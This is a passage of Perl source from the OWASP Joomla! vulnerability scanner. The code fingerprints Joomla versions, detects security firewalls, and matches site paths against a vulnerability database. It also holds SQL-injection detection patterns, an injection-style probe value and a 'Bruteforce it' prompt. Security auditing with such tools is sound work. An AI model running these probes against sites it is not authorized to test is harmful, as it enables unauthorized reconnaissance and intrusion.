            if(md5hex($c) ne $H200bypass){return 1;}            
        }
        else
        {
            if($c !~ /$H200bypass/){return 1;}     
        }
    }
    else
    {
        if(do_HEAD_request($u) =~ /(200|301|403)/){return 1;}     
    }    
    0;
}
sub do_GET_request
{
    my $ua = LWP::UserAgent->new('requests_redirectable'=>['GET','POST']);
    $ua->agent($uagent);
    if(defined($proxy) && $proxy ne '')
    {
        if($proxy !~  /:\/\//){$proxy = 'http://'.$proxy;}
        $ua->proxy(['http', 'ftp'],$proxy );                
    }    
    my $u = shift;    
    my $resquest = GET "$u";	
    my $response = $ua->request($resquest);
    my $htmlContent = '';    
    if($response->status_line =~ /200/)
    {
        return $response->content;
    }
    else
    {
        return '';
    }

}

sub get_xml_version
{
    my $htmlContent = shift;    
    if ($htmlContent =~ /<version>(.*?)<\/version>/gi)
    {
          return $1;
    }
    else {
        return '';
    }
}
sub get_title
{
    my $htmlContent = shift;    
    if ($htmlContent =~ /<title>(.*?)<\/title>/gi)
    {
          return $1;
    }
    else {
        return '';
    }
}
sub trim
{
    my $string = shift;
    $string =~ s/^\s+//;
    $string =~ s/\s+$//;
    return $string;
}

sub nl_to_br
{
    my $string = shift;
    $string =~ s/\n/<br\/>/g;
    return $string;
}
## star* to strong
sub st_to_str
{
    my $string = shift;
    $string =~ s/\*\*/<strong>/g;
    $string =~ s/\*/<\/strong>/g;
    return $string;
}

sub get_components_reported
{
      my $c = shift;
      my @ar = ();
      while($c =~ m{option=(.*?)(&amp;|&|")}ig)      
      {
         if (find_in_array($1,@ar) eq 0)
         {
            push @ar, $1;
         }
      }
      while($c =~ m{\/component\/option,(.*?)\/}ig)      
      {
         if (find_in_array($1,@ar) eq 0)
         {
            push @ar, $1;
         }
      }
      return @ar;      
}

sub find_in_array
{
    my($what, @array) = @_;
     foreach (0..$#array) {
       if ($what eq $array[$_]) {
         return 1;         
       }
     }
     0;                    
}
sub find_in_arrayx
{
    my($what, @array) = @_;
    my $what1 = $what.'+';
    my $what2 = $what.'-';
    
    foreach (0..$#array) {
      if ($what1 eq $array[$_]) {
        return 1;         
      }
      elsif ($what2 eq $array[$_]) {
         return 1;         
      }
    }
    0;                    
}
sub array_max
{
# returned value is used in string
# thus, it's safe to return string for undefined $array[0]
# I can't fill up 999 as Brandon Enright suggested
# bcoz this will falsely report the deduced version range
# best return is "?", which makes people think the unretrievale version
    my @array = @_;
    if($#array eq -1){return '?';}
    my $max = $array[0];    
     foreach (0..$#array) { 
       if ($max < $array[$_]) {
         $max = $array[$_];
       }
     }
     return $max;
}

sub array_min
{
# returned value is used in string
# thus, it's safe to return string for undefined $array[0]
# I can't fill up 0 as Brandon Enright suggested
# bcoz this will falsely report the deduced version range
# best return is "?", which makes people think the unretrievale version
    my @array = @_;
    if($#array eq -1){return '?';}    
    my $min = $array[0];    
     foreach (0..$#array)  {        
       if ($min > $array[$_]) {         
         $min = $array[$_];
       }
     }     
     return $min;
}

sub get_url_content
{
    my $u = shift;    
    my $resquest = GET "$u";
    my $ua = LWP::UserAgent->new('requests_redirectable'=>['GET','POST']);
    $ua->agent($uagent);
    if(defined($proxy) && $proxy ne '')
    {
        if($proxy !~  /:\/\//){$proxy = 'http://'.$proxy;}
        $ua->proxy(['http', 'ftp'],$proxy );                
    }    
    my $response = $ua->request($resquest);    
    if($response->status_line =~ /200/ && $response->header("Content-Type") =~ /(php|html|javascript|css|xml)/)
    {
        return $response->content;        
    }
    else
    {
        return '';
    }    
}
sub get_url_any_content
{
    my $u = shift;    
    my $resquest = GET "$u";
    my $ua = LWP::UserAgent->new('requests_redirectable'=>['GET','POST']);
    $ua->agent($uagent);
    if($proxy ne '')
    {
        if($proxy !~  /:\/\//){$proxy = 'http://'.$proxy;}
        $ua->proxy(['http', 'ftp'],$proxy );                
    }    
    my $response = $ua->request($resquest);    
    if($response->status_line =~ /200/)
    {
        return $response->content;        
    }
    else
    {
        return '';
    }    
}


sub htime{  
  my $t= shift;
  if($t eq 3600) {return '1 hr';}
  elsif($t > 3600){
    my $x = $t/3600;
    my @hm = split(/\./, $x);
    my $h = $hm[0];	
    my $mi = '0 min and 0 sec';
    $mi = htime($t%3600);    
    return $h." hr and $mi";    
  }
  elsif($t > 60) {
    my $m = ($t/60);
    my @rm = (split/\./, $m);
    my $rs = ($t%60);
    return  $rm[0]." min and $rs sec";
  }    
  elsif($t == 60){ return '1 min';}
  elsif($t < 60){return "$t sec";}
}
sub print_time_taken
{
   $end_time = time();
   my $time_taken = $end_time - $start_time;
   print "\n~[*] Time Taken: ".htime($time_taken)."\n";
}
sub bye
{
   print_time_taken();
   print "~[*] Send bugs, suggestions, contributions to ".reverse($JOOMSCAN{bug_report_email})."\n";
   print "\a";
   exit();        
}
sub print_completed_by_percentage
{
    my ($total,$done) = @_;
    if ($done%15 == 0 || $done==$total)
    {
	use Math::BigFloat;
	my $complete = (100/$total)*$done;
        my $completed = Math::BigFloat->new("$complete");
	$completed->precision(-2);
	print "\n[!] $completed\% completed~\n\n";
    }
}

sub get_admin_dir
{   
 
    if(check_if_exists("$url/administrator/") eq 1 )
    {
        return '/administrator/';
    }
    else
    {
        if (check_if_exists("$url/admin/") eq 1 ){return '/admin/';}        
        if (check_if_exists("$url/administration/") eq 1 ){return '/administration/';}        
        if (check_if_exists("$url/manage/") eq 1 ){return '/manage/';}
        
        if (check_if_exists("$url/joomla/administrator/") eq 1 ){return '/joomla/administrator/';}        
        if (check_if_exists("$url/joomla/admin/") eq 1 ){return '/joomla/admin/';}        
        if (check_if_exists("$url/joomla/administration/") eq 1 ){return '/joomla/administration/';}        
        if (check_if_exists("$url/joomla/manage/") eq 1 ){return '/joomla/manage/';}
        
        else{return '/admin_dir_was_renamed/';}
    }   
}

sub print_owasp_logo{
    
print qq {

 ..|''||   '|| '||'  '|'     |      .|'''.|  '||''|.  
.|'    ||   '|. '|.  .'     |||     ||..  '   ||   || 
||      ||   ||  ||  |     |  ||     ''|||.   ||...|' 
'|.     ||    ||| |||     .''''|.  .     '||  ||      
 ''|...|'      |   |     .|.  .||. |'....|'  .||.     
    
 };

}

sub md5hex
{
    my $str = shift;    
    return Digest::MD5->new->add(encode_utf8($str))->hexdigest;
}
sub gimme5
{
    my $str = shift;
    return substr($str,0,5);
}
sub is_sqlin
{
    my $str = shift;
    if ($str =~ /\x1e+[\w]+:+[\w]+\x1e+:+[\w\s]+\x1e/g || $str =~ /:([0-9a-fA-F]{32})/gi 
        || $str =~ m/You\shave\san\serror\sin\syour\sSQL\ssyntax/gi
        || $str =~ m/supplied\sargument\sis\snot\sa\svalid\sMySQL\sresult\sresource/gi
        || $str =~ m/Invalid\sargument\ssupplied\s\for/gi)
    {
        return 1;
    }
    0;    
}
sub is_path_disclosed
{    
    my $str = shift;
    if ($str =~ /(Parse\serror:|Fatal\serror:)\s(.*?)on\sline/gi)
    {
        return 1;
    }
    0;      
}
sub has_fake200s
{
    my $u = shift;
    my $fake_found = 0;
    my $fake_found_t = 0;
    my @r = ('cfcd2','c4ca4','c81e7','eccbc','a87ff','e4da3','167e0','8f14e','c9f0f','45c48');
    foreach my $i(@r)
    {
        if(do_HEAD_request($u."/$i/") =~ /200/)
        {
            $fake_found_t++;
        }
    }
    if($fake_found_t > 5)
    {
        $fake_found = 1;
    }    
    return $fake_found;
}
sub get_fake200s
{
    ## first we print hash
    ## second we grep title
    my $u = shift;
    my @r = ('c4ca4','c81e7','eccbc','a87ff','e4da3','167e0','8f14e','c9f0f','45c48');
    my @pg5 = ();
    my @ti = ();
    foreach my $i(@r)
    {
        my $con = get_url_content($u."/$i/");
        push @ti, get_title($con);
        push @pg5, md5hex($con);
    }
    my $pg_i = md5hex(get_url_content($u."/cfcd2/"));
    if( find_in_array($pg_i,@pg5) )
    {
        return $pg_i;
    }
    else
    {
        # let's try more
        my $pg_t = get_title(get_url_content($u."/cfcd2/"));
        if( find_in_array($pg_t,@pg5) )
        {
            return $pg_t;
        }        
    }
    0;
}
sub get_hostn
{
    my $u = shift;
    $u =~ s/http:\/\///;
    $u =~ s/https:\/\///;
    if(index($u,'/') < 0)
    {
        return $u;
    }
    else
    {
        return substr($u,0,index($u,'/'));
    }
    
}
# if equal, return 1, else return bigger version
# consider major,minor,revision,build
sub get_bigger_ver
{
    my ($a,$b) =@_;
    my $x = substr($a,0,3); # 2.5
    my $y = substr($b,0,3); # 2.6
    if($x > $y){return $a;} #
    elsif($x < $y){return $b;} # 2.6
    elsif($x == $y){my $i = substr($a,4,6);my $j = substr($b,4,6);if($i > $j){return $a;}elsif($i < $j){return $b;}else{return 1;}}
    else{return 0;}
}
sub pie_values
{
    my $r = "";
    if($J_XSS_HOLES > 0){$r .= "['XSS', $J_XSS_HOLES],";}
    if($J_SQLin_HOLES > 0){$r .= "['SQL Injection', $J_SQLin_HOLES],";}
    if($J_FI_HOLES > 0){$r .= "['File Inclusion', $J_FI_HOLES],";}
    if($J_INFO_HOLES > 0){$r .= "['Information Disclosure', $J_INFO_HOLES],";}
    if($J_DirTr_HOLES > 0){$r .= "['Directory Traversal', $J_DirTr_HOLES ],";}
    if($J_OTHER_HOLES > 0){$r .= "['Others', $J_OTHER_HOLES],";}        
    $r =~ s/,$//;
    return $r;
} 
sub pie_colors
{
    my @c =  ('#CB0A0A',  '#FB4800', '#FF6B28','#FB9900','#923A2E','#CA6558');
    my $t = 0;my $r = "[";
    
    if($J_XSS_HOLES > 0){$t++;}   if($J_SQLin_HOLES > 0){$t++;}    if($J_FI_HOLES > 0){$t++;}    if($J_INFO_HOLES > 0){$t++;}    if($J_DirTr_HOLES > 0){$t++;}    if($J_OTHER_HOLES > 0){$t++;}
    for my $e(0..$#c)
    {
        if($e < $t) {  $r .= "'".$c[$e]."',"  }
    }
    $r =~ s/,$//; $r .= "];";
    return $r;
}
######### [/ROUTINES] #########

$admin_dir = get_admin_dir($url);

print_owasp_logo();

print qq{
=================================================================
OWASP Joomla! Vulnerability Scanner v$JOOMSCAN{scanner_version}  
(c) $JOOMSCAN{author}
YGN Ethical Hacker Group, Myanmar, http://yehg.net/lab
Update by: Web-Center, http://web-center.si (2011)
=================================================================

};

$found = 0; ## refer to the number of vunerable stuffs found
$rfifound = 0;

print qq{
Vulnerability Entries: $dbentry
Last update: $lastupdate

Use "update" option to update the database
Use "check" option to check the scanner update
Use "download" option to download the scanner latest version package
Use svn co to update the scanner and the database
svn co https://joomscan.svn.sourceforge.net/svnroot/joomscan joomscan 


Target: $url

};

### 503/404 Check Fingerprinting ###
$target =$ua->get("$url");
if($target->status_line =~ /(40|50)/g)
{
    print '[x] Unable to process any more. I get - '. $target->status_line."\n\n";
    bye;
}
if ($target->content =~ /(Database\sError:\sUnable\sto\sconnect\sto\sthe\sdatabase|This\ssite\sis\stemporarily\sunavailable)/gi)
{
    print "### The site is probably in maintenance.###\n\n";
    sleep(3);
}

if (defined($target->header('Server')))
{
    print 'Server: '.$target->header('Server')."\n";
    $server_headers .= 'Server: '.$target->header('Server')."\n";
}
if (defined($target->header('X-Powered-By')))
{
    print 'X-Powered-By: '.$target->header('X-Powered-By')."\n";
    $server_headers .= 'X-Powered-By: '.$target->header('X-Powered-By')."\n";
}

if(($args{o}) && $args{o} eq 'h')
 {
     open(EX,">$outfile") || die "Cannot open $urlfile $!";      
     print EX "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"    \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\" dir=\"ltr\">\n<head>\n<title>".get_hostn($url)." ($today) | OWASP Joomla! Vulnerability Scanner Result\</title>\n<meta name=\"Generator\" value=\"OWASP Joomla! Vulnerability Scanner\"/>\n<script type=\"text/javascript\" src=\"assets/js/jquery-1.3.2.min.js\"></script>\n<script type=\"text/javascript\" src=\"assets/js/jquery.enumerable.js\"></script>\n<script type=\"text/javascript\" src=\"assets/js/jscharts.js\"></script>\n<link rel=\"stylesheet\" href=\"assets/css/style1.css\" type=\"text/css\"  charset=\"utf-8\" />\n<script>\$(document).ready(function () {area = \$('#vuln_pie'),area.after('<div style=\"font-size:0.9em;margin-left:3.5%;\">'+\$(\"#vuln_point_total\").html()+'<br/><\/div>'); });</script>\n</head>\n<body style='padding:1% 3% 3% 3%;'>\n<h2>\n<span style=\"cursor: pointer;\" onclick='window.open(\"http://owasp.org\");return false;'><img src=\"assets/img/owasp-joomla.png\" width=\"170\" height=\"125\" alt=\"OWASP Joomla! Vulnerability Scanner\"></span>\n<span style=\"text-align: center;position:relative;top:-20;font-family:'times news roman'!important;\">OWASP Joomla! Vulnerability Scanner<!-- v$JOOMSCAN{scanner_version} (Database Update: $lastupdate)--></span></h2>\n<div style=\"font-size:0.8em; background-color:#D9EDF7;border: 1px solid rgb(204, 204, 204);padding:0% 2% 2% 2%;-moz-border-radius: 1% 1% 1% 1%;\">\n<h2>$url</h2>".nl_to_br($server_headers)."<br/>Date: $now<br/></div><span style=\"float:right;\"><input  type=\"button\" onclick='if(document.getElementById(\"cxp\").style.display==\"none\"){document.getElementById(\"cxp\").style.display=\"\";}else{document.getElementById(\"cxp\").style.display=\"none\"}' value=\"Open URL Box\" /><br clear=\"all\" /><a href=\"javascript:void(0)\" onclick=\"this.style.display='none';\$('input').css('display','none')\" style=\"font-size:12px;position:absolute;left:91%;top:3%;\">Printable View</a></span><br clear=\"all\"/>
<br/>\n<fieldset id=\"cxp\" style=\"display:none\"><legend>Exploit [<a href='javascript:void(0)' onclick='if(document.getElementById(\"url-form\").style.display==\"none\"){document.getElementById(\"url-form\").style.display=\"\";}else{document.getElementById(\"url-form\").style.display=\"none\"}'>toggle</a>]&nbsp; [<a href=\"javascript:void(0)\" onclick=\"document.getElementById('cxp').style.display='none'\">close</a>]</legend><span id='url-form'>URL: [<a href='http://yehg.net/encoding' target='_blank'>PCE</a>]<br/> <textarea style='' id='url' rows='5' cols='80' type='text'>$url</textarea><br/><input type='button' value='               Confirm Xploit               ' onclick='window.open(document.getElementById(\"url\").value)'/> <input type='button' value='               Clear               ' onclick='document.getElementById(\"url\").value=\"\"'/><br/></span></fieldset><span class=\"ti\">Vulnerability Summary</span><br/><br/><br/><span id='vuln_graph'></span><br/><br/><span id='vuln_pie'></span><br/><br/><br/>\n<span  class=\"ti\">Reconnaissance Result </span><br/><br/><br/><div style=\"margin-left:3%\">";
 }
 elsif(($args{o}) && $args{o} eq 't')
 {
     open(EX,">$outfile");
     print EX "

 ..|''||   '|| '||'  '|'     |      .|'''.|  '||''|.  
.|'    ||   '|. '|.  .'     |||     ||..  '   ||   || 
||      ||   ||  ||  |     |  ||     ''|||.   ||...|' 
'|.     ||    ||| |||     .''''|.  .     '||  ||      
 ''|...|'      |   |     .|.  .||. |'....|'  .||.     
    
 ";
     print EX "\nOWASP Joomla! Vulnerability Scanner v$JOOMSCAN{scanner_version} Results\nDate: $now\n\nTarget : $url\n\n$server_headers\n\n";
 }

if ($admin_dir =~ /renamed/gi)
{
    print "\n\n## NOTE: The Administrator URL was renamed. Bruteforce it. ##\n## None of /administrator, /admin, /manage ##\n";
}

## [Essential Check] ###
   print qq{

## Checking if the target has deployed an Anti-Scanner measure
};
if(has_fake200s($url) eq 1)
{
    print qq{
## WARNING ##

[!] The target responds with 200 for every 404 request
[!] Activating anti-200 Bypass ...  Please wait.
};
  $H200bypass = get_fake200s($url);
  if($H200bypass eq 0)
  {
    print "\a\a"; # Attention please!
    print qq{

[!] Damn, unable to bypass! The target emits random strings.
[!] I need your help. 

[!] Enter strings in common or valid regular expression
    when you see after requesting the two urls:
    $url/a_sdf and $url/hj_kl
    e.g Page Not Found, \\d{10,15}
    
 >> };
    my $tmpuinput = <STDIN> ;
    chomp($tmpuinput);
    while($tmpuinput eq "")
    {
        print qq{
[!] Enter strings in common or valid regular expression
    when you see afer requesting the two urls:
    $url/a_sdf and $url/hj_kl
    e.g Page Not Found, \\d{10,15}
    
 >> };
    chomp($tmpuinput = <STDIN>);
    
    }
    my $a404c = get_url_content("$url/akdjflaksdjfaslkfjas");
    
   
    ## must validate user input , must work
    my $v_200 = 0;
    my $r_syn = 0;
    while ($v_200 eq 0)
    {
        eval {
            if( $a404c  =~ m{$tmpuinput} ) {  }
            };
        $r_syn = 1 unless $@;
        
        if($r_syn eq 1)
        {
            if( $a404c  =~ m{$tmpuinput} ) { $v_200 = 1;  }            
        }
        
        unless($v_200 eq 1)
        {
        print qq{
[!] [ERROR] Your strings do not work or are not found in page!
};
        $tmpuinput = '';
        while($tmpuinput eq "")
        {
            print qq{
 >> };
            $tmpuinput = <STDIN>;
            chomp($tmpuinput);    
            }        
        }        
    }

    $H200bypass = $tmpuinput;
    print qq{
[!] OK. Your strings work. Thanks!
};
    undef $tmpuinput;

  }
  else
  {
    print qq{
[!] OK, got a unique hash - $H200bypass
};
  }
  ## Here we've got the value $H200bypass
  ## we'll use it to check actual 404
   
}

else
{
    print "\n[!] Scanning Passed ..... OK \n";
}
## [/Essential Check] ###

### [Joomla! Firewall Detection] ###
my $firewall_found = '';

if( (!defined($args{n})) or (defined($args{n}) && $args{n} !~ /f/g) )
{
   print qq{

## Detecting Joomla! based Firewall ...
};

    if(check_if_exists($url.$admin_dir."/components/com_rsfirewall/") eq 1 or
       check_if_exists($url."/components/com_rsfirewall/") eq 1 or
       check_if_exists($url.$admin_dir."/components/com_firewall/") eq 1 or
       check_if_exists($url."/components/com_firewall/") eq 1  )
    {
        $firewall_found .= qq{  
[!] A Joomla! RS-Firewall (com_rsfirewall/com_firewall) is detected.
[!] The vulnerability probing may be logged and protected.
};
    }

    if(check_if_exists($url.$admin_dir."/components/com_jfw/") eq 1 or
       check_if_exists($url."/components/com_jfw/") eq 1 or
       check_if_exists($url.$admin_dir."/components/com_jfirewall/") eq 1 or
       check_if_exists($url."/components/com_jfirewall/") eq 1 
       
       )
    {
        $firewall_found .= qq{  
[!] A Joomla! J-Firewall (com_jfw) is detected.
[!] The vulnerability probing may be logged and protected.
};
    }
    
    if(check_if_exists($url.$admin_dir."/modules/mod_securelive/") eq 1 or
       check_if_exists($url."/modules/mod_securelive/") eq 1 or
       check_if_exists($url.$admin_dir."/components/com_securelive/") eq 1 or
       check_if_exists($url."/components/com_securelive/") eq 1 
       )
    {
        $firewall_found .= qq{  
[!] A SecureLive Joomla!(mod_securelive/com_securelive) firewall is detected.
[!] The vulnerability probing may be logged and protected.
};
    }

    if(check_if_exists($url.$admin_dir."/media/ninjasecurity") eq 1 or
       check_if_exists($url."/plugins/system/ninjasecurity") eq 1 or
       check_if_exists($url."/plugins/system/ninjasecurity.php") eq 1 
       )
    {
        $firewall_found .= qq{  
[!] A SecureLive Joomla! firewall is detected.
[!] The vulnerability probing may be logged and protected.
};
    }
    
    
    if(check_if_exists($url."/init.php") eq 1 or
       check_if_exists($url."/firewall.php") eq 1 or
       check_if_exists($url."/fsAdmin/") eq 1 or
       check_if_exists($url."/fsadmin/") eq 1 or
       get_url_content($url) =~ /<div id='fws\-copyright'><a href='http:\/\/firewallscript\.com'>Protected by FireWall Script<\/a><\/div>/ 
       )
    {
        $firewall_found .=   qq{    
[!] FWScript(from firewallscript.com) is likely to be used.
[!] The vulnerability probing may be logged and protected.
};
    }
    
    if(check_if_exists($url.$admin_dir."/components/com_joomscan/") eq 1 or
       check_if_exists($url."/components/com_joomscan/") eq 1 or
       check_if_exists($url.$admin_dir."/components/com_joomlascan/") eq 1 or
       check_if_exists($url."/components/com_joomlascan/") eq 1
       )
    {
        $firewall_found .=  qq{    
[!] A Joomla! security scanner (com_joomscan/com_joomlascan) is detected.
[!] It is likely that webmaster routinely checks insecurities.
};
   }
    
    if(check_if_exists($url.$admin_dir."/components/com_securityscan/") eq 1 or
       check_if_exists($url."/components/com_securityscan/") eq 1 or
       check_if_exists($url.$admin_dir."/components/com_securityscanner/") eq 1 or
       check_if_exists($url."/components/com_securityscanner/") eq 1
       )
    {
        $firewall_found .=  qq{    
[!] A security scanner (com_securityscanner/com_securityscan) is detected.
};
    }

    ## Source Code Reader: Help, I'd like to know the name of this componet
    if(get_url_content($url."?tell_me_if_antihacker_exist=1%20and%201=2") =~ /Banned:\ssuspicious\shacking\sbehaviour/gi or
       get_url_content($url."/index.php?option=com_phpantihacker") =~ /Banned:\ssuspicious\shacking\sbehaviour/gi
       
       )
    {
        $firewall_found .= qq{  
[!] A Joomla! Open Source PHP Anti-Hacker Joomla Component is detected.
[!] The vulnerability probing may be denied.
};

    }
    
    
    if(check_if_exists($url."/plugins/system/jsecure.xml") eq 1 or
       check_if_exists($url."/plugins/system/jsecure.php") eq 1)
       
    {
        $firewall_found .= qq{  
[!] A Joomla! jSecure Authentication is detected.
[!] You need additional secret key to access /administrator directory
[!] Default is jSecure like /administrator/?jSecure ;)
};
    }

    if(check_if_exists($url."/components/com_guardxt/") eq 1 or
       check_if_exists($url.$admin_dir."/components/com_guardxt/") eq 1)
       
    {
        $firewall_found .= qq{  
[!] A Joomla! GuardXT Security Component is detected.
[!] It is likely that webmaster routinely checks for insecurities.
};
    }

    if(check_if_exists($url."/components/com_jdefender/") eq 1 or
       check_if_exists($url.$admin_dir."/components/com_jdefender/") eq 1 or
       check_if_exists($url.$admin_dir."/language/en-GB/en-GB.com_jdefender.ini") eq 1       
       )
       
    {
        $firewall_found .= qq{  
[!] A Joomla! JoomSuite Defender is detected.
[!] The vulnerability probing may be logged and protected.
};
    }    
    
    
    if(check_if_exists($url."/htaccess.txt") ne 1)
    {
        $firewall_found .=   qq{    
[!] .htaccess shipped with Joomla! is being deployed for SEO purpose
[!] It contains some defensive mod_rewrite rules
[!] Payloads that contain strings (mosConfig,base64_encode,<script>
    GLOBALS,_REQUEST) wil be responsed with 403.
};
    }

    
    if($firewall_found eq ''){ $firewall_found =  "\n[!] No known firewall detected!\n";}

    print $firewall_found;
    
    if ($firewall_found !~ /Nothing/){sleep(3);}
    
    if (($args{o}) && $args{o} eq 'h')
    {                
        print EX "<span class=\"sti\">+Jooma! Based Firewall Detection</span><br/>";
        $firewall_found .= "\n";
        print EX nl_to_br(st_to_str(encode_entities($firewall_found)));	    
    }
    elsif (($args{o}) && $args{o} eq 't')
    {
        print EX "Jooma! Based Firewall Detection Result\n======================================\n";
        $firewall_found .= "\n";
        print EX $firewall_found;	    
    }

}

### [/Joomla! Firewall Detection] ###

### Fingerprinting ###

if( (!defined($args{n})) or (defined($args{n}) && $args{n} !~ /v/) )
{
   print qq{

## Fingerprinting in progress ...

};
        my $fp1 = threads->create(\&fprint_generic,$target->content);
        my $fp2 = threads->create(\&fprint_meta10x,$target->content);
        my $fp3 = threads->create(\&fprint_htac10x);
        grep{$_->join;}($fp1,$fp2,$fp3);
        sleep(1);
        my $fp4 = threads->create(\&fprint_config_dist10x);
        my $fp5 = threads->create(\&fprint_extended_10x);        
        my $fp6 = threads->create(\&fprint_htac15x);
        grep{$_->join;}($fp4,$fp5,$fp6);
        sleep(1);
        my $fp7 = threads->create(\&fprint_config_dist15x);
        my $fp8 = threads->create(\&fprint_enGBxml_15x);
        my $fp9 = threads->create(\&fprint_enGBini_15x);
        sleep(1);
        grep{$_->join;}($fp7,$fp8,$fp9);
        my $fp10 = threads->create(\&fprint_admin_enGBcom_configini_15x);
        my $fp11 = threads->create(\&fprint_admin_enGBini_15x);
        my $fp12 = threads->create(\&fprint_adminlists_html_15x);        
        sleep(1);
        my $fp13 = threads->create(\&fprint_admin_enGB_com_media_15x);        
        
        grep{$_->join;}($fp10,$fp11,$fp12,$fp13);
        
        
        if ($version eq ''){$version = "~Unable to detect the version. Is it sure a Joomla? \n";}
        
        if ($exact_version_found eq 0)
        {            
            $biggest_version_min = array_max(@version_min_range);
            $lowest_version_max = array_min(@version_max_range);
            
            if($version =~ /1\.0\.x/)
            {
                $version .= "\n* Deduced version range is : [1.0.$biggest_version_min - 1.0.$lowest_version_max]\n";                
            }
            elsif($version =~ /1\.5\.x/)
            {
                $version .=  "\n* Deduced version range is : [1.5.$biggest_version_min - 1.5.$lowest_version_max]\n";
            }
            
        }
        else
        {
            $version .=  "\n* The Exact version found is $exact_version\n";
        }
        print $version;
        if (($args{o}) && $args{o} eq 'h')
        {                
            print EX "<span class=\"sti\">+Version Information</span><br/><br/>";
            if ($exact_version_found ne 0){$version =~ s/$exact_version/<b>$exact_version<\/b>/g;}
                        
            print EX nl_to_br(st_to_str($version));
            ## restore
            if ($exact_version_found ne 0){$version =~ s/<b>$exact_version<\/b>/$exact_version/g;}            
        }
        elsif (($args{o}) && $args{o} eq 't')
        {
            print EX "Fingerprinting Result\n=====================\n\n";
            $version .= "\n\n";
            print EX $version;	    
        }
    
        
        

        

    print qq{
## Fingerprinting done.
};
	if($args{p} && $args{p} eq 'e')
	{
	    bye;
	}
}
### END Of Fingerprinting ###




### List components extracted from index page ####


my @coms_used = (get_components_reported($target->content));
my $row = 1;
print "\n";
if ($#coms_used ne -1)
{   
    print "\n## ".($#coms_used+1)." Components Found in front page  ##\n\n";
    if(($args{o}) && $args{o} eq 'h'){print EX "<br/><span class=\"sti\">+Components Found in front page (". ($#coms_used+1).")</span><br/><!--<pre>--><ul>";}
    if(($args{o}) && $args{o} eq 't'){print EX "## ".($#coms_used+1)." Components Found in front page  ##\n\n";}    
    foreach my $com(@coms_used)
    {      
      if ($row%3 eq 0)
      {
            print "\n";
	    if(($args{o})){print EX "\n";}	    
      }  
      print " $com\t";
      if(($args{o})&& $args{o} eq 't'){print EX "$com\t";}
      if(($args{o})&& $args{o} eq 'h'){print EX "<li>$com</li>";}
      $row++;
    }
    if(($args{o}) && $args{o} eq 'h'){print EX "</ul>";}
    if(($args{o}) && $args{o} eq 't'){print EX "\n\nVulnerabilities Discovered\n==========================";}    
    print "\n\n";

}
if(($args{o}) && $args{o} eq 'h'){print EX "<br/><br/><!--</pre>--></div><span  class=\"ti\">Vulnerability Assessment Result </span><br/><br/><br/><div style=\"margin-left:3%\"><span class=\"sti\">+Vulnerabilities
Discovered</span><br/>";}
if(($args{o}) && $args{o} eq 't'){print EX "\n\nVulnerabilities Discovered\n==========================";}    
print "\n\n";
### /List components extracted from index page ####

### Scanning Core ####

print "\nVulnerabilities Discovered\n==========================\n\n";
open(JO, "$JOOMSCAN{joomdbfile}") || die "Cannot open $JOOMSCAN{joomdbfile} : $!";
my $timer = 0;
my $total_found_entries = 0;
my $found_vulnerable = 0;
my @checked_urls = ();

while(<JO>) {
    chomp;
    
    my $info = substr($_,0,index($_,'Version'));
    if ($info =~ /^###/){next;}

    if (length($info) ne 0)
    {
	my $jversion = substr($_,index($_,'Version'),(length(substr($_,0,index($_,'|')))-length($info)));
	my $check = substr($_,index($_,'|')+1,((rindex($_,'|')-(index($_,'|'))-1)));
	my $exploit = substr($_,rindex($_,'|')+1);
        
        
        my $component_onfocus = 'N/A';
        my $component_onfocus_Itemid = 'N/A';
        my $component_onfocus_id = 'N/A';

        
	$check =~ s/\s//g;
	$info =~ s/^\s//g;
        
        $info =~ s/\s\s\s\s/  /g;
        $info =~ s/\s\s\s/  /g;        
	$info =~ s/\s\s/ /g;
        
        $jversion =~ s/\s\s\s\s/  /g;
        $jversion =~ s/\s\s\s/  /g;
        $jversion =~ s/\s\s/ /g;
    
	## match only to what it exists - administrator, admin
	if ($check =~ /\/administrator/g)
	{
	       $check =~ s/\/administrator/$admin_dir/gi;		                       
	}
        
        ## // -> /
        $check =~ s/\/\//\//g;
        ## /dir -> /dir/
         if($check !~ /\/$/ && $check !~ /(\.)[a-z-A-Z-0-9]/g)
        {
            $check =~ s/\?//g;
            $check .= '/';
            $check =~ s/\/\//\//g;            
        }
        if ($check =~ m{com_(.*?)/}ig){ $component_onfocus = 'com_'.$1;}

        if($target->content =~ m{option=$component_onfocus&Itemid=(.*?)&id=(.*?)(&amp;|&|")}ig)
        {
           $component_onfocus_Itemid = $1;$component_onfocus_id = $2;
        }
        elsif($target->content =~ m{option=$component_onfocus&amp;(.*?)&amp;Itemid=(.*?)(&amp;|&|")}ig)
        {
           $component_onfocus_Itemid = $2;
        }        
        if($target->content =~ m{option=$component_onfocus&amp;(.*?)&amp;id=(.*?)(&amp;|&|")}ig)
        {
           $component_onfocus_id = $2;
        }
     
   
    if(length($check) ne 0 )
    {
        my $resource_found = 0; ## e.g does /components/com_vulnerable exist ?
        
        # if this has not been HEAD checked, we add it to checked_urls & we HEAD check it        
        if (find_in_arrayx(gimme5(md5hex($check)),@checked_urls) eq 0)
        {
            
            my $request_chk = check_if_exists("$url$check");
            
            if(($args{v}) && $args{v}  =~ /u/gi){ print "\n$url$check --- ",$request_chk ,"\n"; }

            if($request_chk eq 1)
            {
                push @checked_urls, gimme5(md5hex($check)).'+';
                $resource_found = 1;
            }else{push @checked_urls, gimme5(md5hex($check)).'-';}
            

        }
        else
        {
            ## check url only once, no more twice or thrice
            if (find_in_array(gimme5(md5hex($check)).'+',@checked_urls) eq 1){$resource_found = 1;}
        }

            
        ########## [Information Gathering] ######################
        # if resource is found, then we audit it to find vulnerability        
        if($resource_found eq 1)
        {
            if($found==0)
            {
                if(($args{o}) && $args{o} eq 'h')
                {
                    print EX "<ol>";
                }
                elsif(($args{o}) && $args{o} eq 't')
                {
                    print EX "\n\n";
                }
            }
            else
            {
                if($args{o})
                {
                    open(EX,">>$outfile") || die "Cannot open $outfile $!";
                }
            }
            $found++;
            
            # clean info
            if($info =~ /(RFI|LFI)/)
            {
                $info =~ s/LFI/Local File Inclusion/;
                $info =~ s/RFI/Remote File Inclusion/;
            }
            
            print '# '.$found."\n";
            print "Info -> $info\n$jversion\nCheck: $check\nExploit: $exploit";
            if(($args{o}) && $args{o} eq 'h')
            {
